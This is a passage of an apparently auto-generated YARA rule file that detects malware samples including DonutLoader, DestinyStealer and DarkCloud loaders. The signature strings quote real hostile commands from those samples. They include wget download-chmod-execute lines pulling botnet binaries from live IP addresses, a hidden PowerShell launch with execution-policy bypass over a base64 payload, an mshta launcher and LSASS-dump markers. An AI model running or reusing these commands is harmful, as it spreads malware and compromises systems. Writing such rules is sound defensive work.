      $s13 = "VTyzVTShrFuwnTIwnl5fo3qypvtcVTyhVUIloP5fo3qypvtcVTMipvOwnTIwnlOcovOmnT9lqS9wnTIwn2IlXGbXVPNtVPNtVPO1pzjtCFORFF5mMKAmnJ9hYzqyqPu1" ascii /* score: '11.00'*/
      $s14 = "vcmFjaW5nb25kZW1hbmQueHl6L25vbmVvZnlvdXJlYnVzaW5lc3MvbWljcm9yYWNpbmcuanNvbiIKCiNyb290X3htbF91cmwgPSAgImh0dHA6Ly9yYWNpbmdvbmRlbWF" ascii /* score: '11.00'*/
      $s15 = "29hqTScozIlYyWyMaWyp2tvXDbXpzIanKA0MKWspz91qTImXUOfqJqcovxXPzEyMvOgLJyhXPx6PvNtVPOjoUIanJ4hpaIhXPxXVPNtVUWyqUIlovNjPtccMvOsK25uo" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 10KB and
      8 of them
}

rule d4c0d093fd7c105e1125a9b738736b75f6c7d9dceca4cb8d99179b7992aa9844_d4c0d093 {
   meta:
      description = "_subset_batch - file d4c0d093fd7c105e1125a9b738736b75f6c7d9dceca4cb8d99179b7992aa9844_d4c0d093.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d4c0d093fd7c105e1125a9b738736b75f6c7d9dceca4cb8d99179b7992aa9844"
   strings:
      $s1 = "* 5B!5" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xc0e8 and filesize < 200KB and
      all of them
}

rule DonutLoader_signature__3 {
   meta:
      description = "_subset_batch - file DonutLoader(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b7fae51d9e59a8ed58190c43c50d29a0f6b2afb5621730f7544232569cb8f8d"
   strings:
      $s1 = "shellcode.bin" fullword ascii /* score: '27.00'*/
      $s2 = "shellcode(1).bin" fullword ascii /* score: '24.00'*/
      $s3 = "shellcode(2).bin" fullword ascii /* score: '24.00'*/
      $s4 = "* 5B!5" fullword ascii /* score: '9.00'*/
      $s5 = "qMUhzFtp" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 6000KB and
      all of them
}

rule eb7da355ece2281f32975a499c91610f5dc4bf5d313f7f646fbbda53e20749f2_eb7da355 {
   meta:
      description = "_subset_batch - file eb7da355ece2281f32975a499c91610f5dc4bf5d313f7f646fbbda53e20749f2_eb7da355.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eb7da355ece2281f32975a499c91610f5dc4bf5d313f7f646fbbda53e20749f2"
   strings:
      $x1 = "cmd.exe /C start shell:AppsFolder\\Microsoft.FlightSimulator_8wekyb3d8bbwe!App -FastLaunch" fullword ascii /* score: '41.00'*/
      $x2 = ":: cmd.exe /C start mshta \"%splash%\"" fullword ascii /* score: '36.00'*/
      $s3 = "set \"splash=%temp%\\tmp.hta\"" fullword ascii /* score: '22.00'*/
      $s4 = "set \"imageurl=https://fsuipc.simflight.com/beta/desktop-hero_8711a4cf.jpg\"" fullword ascii /* score: '17.00'*/
      $s5 = "::start \"\" \"D:\\Tools MSFS2020\\FSUIPC7\\FSUIPC7.exe\"" fullword ascii /* score: '17.00'*/
      $s6 = "::timeout /t %delay% /nobreak > NUL" fullword ascii /* score: '16.00'*/
      $s7 = "if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start \"\" /min \"%~dpnx0\" %* && exit" fullword ascii /* score: '15.00'*/
      $s8 = ">\"%splash%\" (type \"%~f0\"|findstr /bc:\"      \")" fullword ascii /* score: '13.00'*/
      $s9 = "set /a delay = 60" fullword ascii /* score: '12.00'*/
      $s10 = "set /a adps = 3" fullword ascii /* score: '12.00'*/
      $s11 = "set /a height = 0" fullword ascii /* score: '12.00'*/
      $s12 = "set /a width = 0" fullword ascii /* score: '12.00'*/
      $s13 = ":: remove CMD window" fullword ascii /* score: '9.00'*/
      $s14 = "set /a dur = 25" fullword ascii /* score: '9.00'*/
      $s15 = "start mshta \"%splash%\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule d575e3f907f9956a884a1c9550dd641249f233263cc768bd04db02509a34d242_d575e3f9 {
   meta:
      description = "_subset_batch - file d575e3f907f9956a884a1c9550dd641249f233263cc768bd04db02509a34d242_d575e3f9.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d575e3f907f9956a884a1c9550dd641249f233263cc768bd04db02509a34d242"
   strings:
      $s1 = "Signed and stamped sales contract.exe" fullword ascii /* score: '19.00'*/
      $s2 = "ee10qWWVj" fullword ascii /* base64 encoded string*/ /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule dea9b489268c52ed86227173f4a350ba_imphash_ {
   meta:
      description = "_subset_batch - file dea9b489268c52ed86227173f4a350ba(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "11e530ab3d9870c7f1e73c053065ae983ab3aa29c5c28ed2fc983c24a670d325"
   strings:
      $s1 = "tlsass.exe" fullword wide /* score: '26.00'*/
      $s2 = "dump success" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      all of them
}

rule d5d7d159eb313151dfca81568218f93e7d27ee65d7b26d3a2489cdc1fa7689fa_d5d7d159 {
   meta:
      description = "_subset_batch - file d5d7d159eb313151dfca81568218f93e7d27ee65d7b26d3a2489cdc1fa7689fa_d5d7d159.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d5d7d159eb313151dfca81568218f93e7d27ee65d7b26d3a2489cdc1fa7689fa"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.87.166/0010101010100101101010111010101011010101110101" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule d784cd2bddc1d1fea6ab6d32306abf44b0e2d93704b1d15f348edadafa6bf6fc_d784cd2b {
   meta:
      description = "_subset_batch - file d784cd2bddc1d1fea6ab6d32306abf44b0e2d93704b1d15f348edadafa6bf6fc_d784cd2b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d784cd2bddc1d1fea6ab6d32306abf44b0e2d93704b1d15f348edadafa6bf6fc"
   strings:
      $s1 = "wfqzcutm" fullword ascii /* score: '8.00'*/
      $s2 = "xqnhvuag" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule d8022a5ec38d36badd29cc9bd41945413611d8b6c30213e4491fa97a2efc2cce_d8022a5e {
   meta:
      description = "_subset_batch - file d8022a5ec38d36badd29cc9bd41945413611d8b6c30213e4491fa97a2efc2cce_d8022a5e.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d8022a5ec38d36badd29cc9bd41945413611d8b6c30213e4491fa97a2efc2cce"
   strings:
      $x1 = "Start-Process powershell -WindowStyle Hidden -ArgumentList \"-ex Bypass -File `\"$tmpF`\"\"" fullword ascii /* score: '35.00'*/
      $s2 = "$tmpF=Join-Path $env:TEMP ([io.path]::GetRandomFileName()+\".ps1\")" fullword ascii /* score: '20.00'*/
      $s3 = "set-content $tmpF -Value $vNGY -Encoding UTF8" fullword ascii /* score: '16.00'*/
      $s4 = "5pPt7v7uzR1oz654S27Kn8NejVkCdnYoZBCyo29xlfi+gExpQ36bkE1EbzOeuH1GV7O7wwJqTb+QqcDmtXlmB7/r3RBn5U8t3POrUSEWr3Brms03nSMjo0DAEXrryd2I" ascii /* score: '15.00'*/
      $s5 = "sB/tA0onUunL9k+PbBptBkNIg5qsbQ8aB7XQRurbldeiMgf4v5DBjcX6Kwdax+BSCq88i39Eyzj+Ro/PTA3Ks5+0hgjnGrILJjgv2jQvOBQs5Ua5/uCH9ekeygX9uSO4" ascii /* score: '14.00'*/
      $s6 = "Remove-Item $tmpF -Force -ErrorAction SilentlyContinue" fullword ascii /* score: '14.00'*/
      $s7 = "$vUBw = [Convert]::FromBase64String('H4sIAAAAAAAEALUZ+1PiSPp3q/wfeiM1SVbJ+pid2eNqrhYhKjUgHI9x9sT1YtJI1pBmk47KDf7v932ddB4Q0Lm6TU0" ascii /* score: '11.00'*/
      $s8 = "DGAUWZ4GOCqqgoJpppV4yNVOFKNIttSQ3l2QUijeRikvSFGlXS/NvCVEc1kTQLrGG1OKGv8TWBb+/ieb1As1rSc7F7r3YTazu/kcM08J1S2ImdqxlJlWSqeZp6nqUxIN" ascii /* score: '11.00'*/
      $s9 = "yabAqW0pXiiHOgubX1lDJDqGb3YHPHYj9sLL+sp1H3D+U3xtNohn7+rrThWUcV0wp8dwUXh/drMMg2SENebUHZ4UYQ/wcQisi2HChmELalZHHZwBebjPIVDy6IXY5WEk" ascii /* score: '11.00'*/
      $s10 = "EcJDx08uoG3jowECDMY7Ww1h0qWtR7kDOwevitLpGTK4vYHLzfZ7pEzabVwiIhrSdAIrMxLgr7A2GK4iZAAlCbdenmlIfDS+IQvZJ4YSlF1QLRQOKVTRQC4Gag4knNoS" ascii /* score: '11.00'*/
      $s11 = "JmWppiBjSElIH5PBAkpVYmzAE6RihwGUN/syLwinaqmh1ELfa8Fzq85Y/YdLK6fZtaE2odh3agTvndx6zH24q4R0wc+jEijzhCT/yvNQ/+PBgAbZ/B9zvyAtkFren6Au" ascii /* score: '11.00'*/
      $s12 = "4dwQTQjeCkimO+q+hJ78K90irjwiRBCN3s5TSWL1b2sBNXjNsu3PKXTDFSJv0X0+kvjkYtYeFOKxoedbyYmhTTq1fLeWQ4wgpoVZOqzz18HljIT03h9sq6cRNw/B7ymm" ascii /* score: '11.00'*/
      $s13 = "qWsrENCIjJxd13J7Hg0/p8Au5bwxg3KE8NIYSsgzbgDzwAVFLxniIQ5za9RysT3k8hGEdyhDP5bKWVvI4HSzPu4OaCtDfSEAhuqGao0oy9wVUOtltFl96fyBBtUyUg+Q" ascii /* score: '11.00'*/
      $s14 = "JoICQavLjzJq53oK0eo/vyTKXk1OYEWQDhWJ3a+RQoR3GdlZ/P/rwt7GhQnnI4Q6oB1gSuWo+z2GASCtfSie1SiI6iK1JDZbrAiCPVdIj3/0zojqp/sHAKhCVamrj+/U" ascii /* score: '11.00'*/
      $s15 = "nZMjL7k5lQINHGgB15ejwxPhwYhz/Ynw8UmCnxwIO60fvT07grR7xac8KwycWOAht04CzB7o4RNBZxOnzpTVDKZVzj91Z3nhAJ+x5HjDnPULYAbU4dS7pE4BUJpYXUok" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x7624 and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule d98317748b0ae3dbe9d4ab85bc91d763296ae1bbc699a793f9c6aa996e45e1d4_d9831774 {
   meta:
      description = "_subset_batch - file d98317748b0ae3dbe9d4ab85bc91d763296ae1bbc699a793f9c6aa996e45e1d4_d9831774.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d98317748b0ae3dbe9d4ab85bc91d763296ae1bbc699a793f9c6aa996e45e1d4"
   strings:
      $s1 = "wget http://66.78.40.221/kitty.armv7; chmod 777 kitty.armv7; ./kitty.armv7 ipcam.tplink; rm kitty.armv7" fullword ascii /* score: '16.00'*/
      $s2 = "wget http://66.78.40.221/kitty.mips; chmod 777 kitty.mips; ./kitty.mips ipcam.tplink; rm kitty.mips" fullword ascii /* score: '16.00'*/
      $s3 = "wget http://66.78.40.221/kitty.aarch64; chmod 777 kitty.aarch64; ./kitty.aarch64 ipcam.tplink; rm kitty.aarch64" fullword ascii /* score: '16.00'*/
      $s4 = "wget http://66.78.40.221/kitty.x86_64; chmod 777 kitty.x86_64; ./kitty.x86_64 ipcam.tplink; rm kitty.x86_64" fullword ascii /* score: '16.00'*/
      $s5 = "wget http://66.78.40.221/kitty.armv6; chmod 777 kitty.armv6; ./kitty.armv6 ipcam.tplink; rm kitty.armv6" fullword ascii /* score: '16.00'*/
      $s6 = "wget http://66.78.40.221/kitty.x86; chmod 777 kitty.x86; ./kitty.x86 ipcam.tplink; rm kitty.x86" fullword ascii /* score: '16.00'*/
      $s7 = "wget http://66.78.40.221/kitty.armv5; chmod 777 kitty.armv5; ./kitty.armv5 ipcam.tplink; rm kitty.armv5" fullword ascii /* score: '16.00'*/
      $s8 = "wget http://66.78.40.221/kitty.mipsel; chmod 777 kitty.mipsel; ./kitty.mipsel ipcam.tplink; rm kitty.mipsel" fullword ascii /* score: '16.00'*/
      $s9 = "cd /tmp || cd /var/tmp || cd /var || cd /mnt || cd /dev || cd /" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule da7ea450217c85c5ba294ca020bcc4abc61d600ab897e79f000aaab0d7af9d6d_da7ea450 {
   meta:
      description = "_subset_batch - file da7ea450217c85c5ba294ca020bcc4abc61d600ab897e79f000aaab0d7af9d6d_da7ea450.jar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "da7ea450217c85c5ba294ca020bcc4abc61d600ab897e79f000aaab0d7af9d6d"
   strings:
      $s1 = "fabric.mod.jsonPK" fullword ascii /* score: '10.00'*/
      $s2 = "fabric.mod.json" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 20KB and
      all of them
}

rule DestinyStealer_signature__2e5467cba76f44a088d39f78c5e807b6_imphash_ {
   meta:
      description = "_subset_batch - file DestinyStealer(signature)_2e5467cba76f44a088d39f78c5e807b6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4f2dcf5340cbfee9fc45b05a078e0701b00c630f588708f11db582584403938c"
   strings:
      $s1 = "ZeroTraceOfficialStub.exe" fullword wide /* score: '22.00'*/
      $s2 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0" fullword ascii /* score: '19.00'*/
      $s3 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07" fullword ascii /* score: '16.00'*/
      $s4 = "}TCZeY2N6" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s5 = "http://pki-ocsp.symauth.com0" fullword ascii /* score: '13.00'*/
      $s6 = "* Uh<e" fullword ascii /* score: '9.00'*/
      $s7 = "* g72m.2F" fullword ascii /* score: '9.00'*/
      $s8 = "* >Ctu" fullword ascii /* score: '9.00'*/
      $s9 = "KAYi' -<" fullword ascii /* score: '8.00'*/
      $s10 = "i- kaKWb>S" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 23000KB and
      all of them
}

rule DestinyStealer_signature__2e5467cba76f44a088d39f78c5e807b6_imphash__45858c9d {
   meta:
      description = "_subset_batch - file DestinyStealer(signature)_2e5467cba76f44a088d39f78c5e807b6(imphash)_45858c9d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "45858c9d100c718f8c59053868b1d77667c4c1a568ed671862777df690351007"
   strings:
      $s1 = "ZeroTraceOfficialStub.exe" fullword wide /* score: '22.00'*/
      $s2 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0" fullword ascii /* score: '19.00'*/
      $s3 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07" fullword ascii /* score: '16.00'*/
      $s4 = "http://pki-ocsp.symauth.com0" fullword ascii /* score: '13.00'*/
      $s5 = "lSnN:\\(" fullword ascii /* score: '10.00'*/
      $s6 = "xDll_yT2" fullword ascii /* score: '9.00'*/
      $s7 = "l%o%J.LAw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 23000KB and
      all of them
}

rule DarkCloud_signature__2 {
   meta:
      description = "_subset_batch - file DarkCloud(signature).gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d8d880417eaf629aaf4438c31fa8d9debdac6146a76e4caea69a2ebe6c9a1c08"
   strings:
      $s1 = "*Error en los datos de pago (Pago BBVA).exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 40KB and
      all of them
}

rule DarkCloud_signature__3 {
   meta:
      description = "_subset_batch - file DarkCloud(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "09e709903ca18593a35752d706652afc7937c25b1d328cd7b805575d92f25b86"
   strings:
      $s1 = "Request for quote.scr" fullword ascii /* score: '15.00'*/
      $s2 = "5%\"\"\\+9" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Y' */
      $s3 = "jk &NuSt0p0C" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      all of them
}

rule DarkCloud_signature__4 {
   meta:
      description = "_subset_batch - file DarkCloud(signature).tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "04b97cda8665e018f8279e274b5eca60eb1032f7ff144f5ec5fd18b084da11e0"
   strings:
      $s1 = "n de pago de Santander_Q14119-250623-AT-25-413____pif.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 80KB and
      all of them
}

rule DarkCloud_signature__5 {
   meta:
      description = "_subset_batch - file DarkCloud(signature).uue"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "01f771020451326366c7d39dde8f2748ef2037f8e837b1d72fdbe8d7f5ea70e7"
   strings:
      $s1 = "FComprobante de pago (Pago CitiBanamex)_________________________pdf.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 80KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__703621d1 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_703621d1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "703621d1a012bd342c6725513a74b3233892675fda7ac066103db12f340ffd54"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s3 = "ExecuteAutomatableProcessor" fullword ascii /* score: '26.00'*/
      $s4 = "ExecuteConcreteProcessor" fullword ascii /* score: '26.00'*/
      $s5 = "ExecuteAdaptableProcessor" fullword ascii /* score: '26.00'*/
      $s6 = "ExecuteVirtualProcessor" fullword ascii /* score: '26.00'*/
      $s7 = "Ttyvchqtxna.exe" fullword wide /* score: '22.00'*/
      $s8 = "ProcessPassiveProcessor" fullword ascii /* score: '18.00'*/
      $s9 = "Ttyvchqtxna.Processing" fullword ascii /* score: '18.00'*/
      $s10 = "ExecuteDetachedProc" fullword ascii /* score: '18.00'*/
      $s11 = "HTtyvchqtxna, Version=1.0.6542.9980, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s12 = "SortExecutor" fullword ascii /* score: '16.00'*/
      $s13 = "TrackSortedExecutor" fullword ascii /* score: '16.00'*/
      $s14 = "ProcessTransformableProcessor" fullword ascii /* score: '15.00'*/
      $s15 = "ConcreteProcessorState" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4d490ace {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4d490ace.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4d490ace9c741baa4db3acd1377108c78c992ca5915494d4cbcf577016b17fdf"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s3 = "ExecuteTransformableCommand" fullword ascii /* score: '26.00'*/
      $s4 = "ExecuteVisibleCommand" fullword ascii /* score: '26.00'*/
      $s5 = "Wxdetxii.Execution" fullword ascii /* score: '23.00'*/
      $s6 = "Wxdetxii.exe" fullword wide /* score: '22.00'*/
      $s7 = "Wxdetxii.Processing" fullword ascii /* score: '18.00'*/
      $s8 = "ExecuteController" fullword ascii /* score: '18.00'*/
      $s9 = "FWxdetxii, Version=1.0.5550.23178, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s10 = "MapEfficientExecutor" fullword ascii /* score: '16.00'*/
      $s11 = "ProcessServer" fullword ascii /* score: '15.00'*/
      $s12 = "m_ObserverProcessorRank" fullword ascii /* score: '15.00'*/
      $s13 = "templow" fullword ascii /* score: '15.00'*/
      $s14 = "ConvertDynamicLogger" fullword ascii /* score: '14.00'*/
      $s15 = "loggerProject" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule DonutLoader_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b720b7a364dc2a233578f6a931300aefcfde43f049d3d34b391c7b7c05811f1"
   strings:
      $s1 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s2 = "zHpIoNw9DOVxqjczQUs0n0jR4yOLN3IfkOqeVXY513J+pa+ui1FNrBWZRvyISgD98eBM4LON33QxDQx7BMXNya8PmWz+3hF/T0hT/+0PVJ9p2dhsi5TkCrcdpvfY6Fu4" wide /* score: '17.00'*/
      $s3 = "6.8.1.9" fullword wide /* reversed goodware string '9.1.8.6' */ /* score: '16.00'*/
      $s4 = "JXYkPgBTKB" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s5 = "TlpIXgBRKS" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s6 = "bipDQSZPbF" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s7 = "IVxRbGxhNd" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s8 = "YjlIcFdRUw" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s9 = "OTlxNHgsSW" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s10 = "PltrPDhtcs" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s11 = "RHJSQyZEdJ" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s12 = "XyxUWVJrVl" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s13 = "QlYpJkswQy" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s14 = "JXhtYnJpKD" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s15 = "VUFTMzolNv" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule DonutLoader_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8a9456e4 {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8a9456e4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8a9456e46fb1c7a6d540db737ceaeeb8568659f2fd241622b03c430fb6a60e87"
   strings:
      $s1 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s2 = "vBe3k+JvTyTKW81M+f0Y+hldOVlLztVt5WaNsWenRJH0NnSwzWFmA8KkBhnbOVP53YVzvF6EfvLXx3GA+bX0oeQlwflwCVyHF/pGj7At1GaGXlvUTb50o0A/Z8FYH4l3" wide /* score: '19.00'*/
      $s3 = "cTNgYWhtLj" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s4 = "cCIofkQwYq" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s5 = "JnpkOilAOM" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = "YypZeSBIVC" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s7 = "MEknRjplPT" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s8 = "dCdxOyMkZP" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s9 = "dCsqQVMqaX" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s10 = "TzFHdXYtMU" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s11 = "QzAAfmpyOD" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s12 = "ZldMWzBbYr" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s13 = "SypITThCSX" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s14 = "XUUtJGEncI" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s15 = "JSlmJmxsMw" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3e62c839 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3e62c839.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3e62c839ff25262272f603a089ecccf728a43183bf31459c834f36c71ab8b0cc"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "mely.exe" fullword wide /* score: '22.00'*/
      $s3 = "Bmely, Version=1.0.8416.23014, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = ".NET Framework 4.6l" fullword ascii /* score: '10.00'*/
      $s5 = "feffeefef" ascii /* score: '8.00'*/
      $s6 = "fefefeffea" ascii /* score: '8.00'*/
      $s7 = "ffeefeffefe" ascii /* score: '8.00'*/
      $s8 = "fefeffeeffe" ascii /* score: '8.00'*/
      $s9 = "feffefefe" ascii /* score: '8.00'*/
      $s10 = "ffeeffefe" ascii /* score: '8.00'*/
      $s11 = "ffefeeffea" ascii /* score: '8.00'*/
      $s12 = "ffeeffefefe" ascii /* score: '8.00'*/
      $s13 = "ffeeffefea" ascii /* score: '8.00'*/
      $s14 = "afeffefefeef" ascii /* score: '8.00'*/
      $s15 = "feffefefeef" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3bc8b86b {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3bc8b86b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
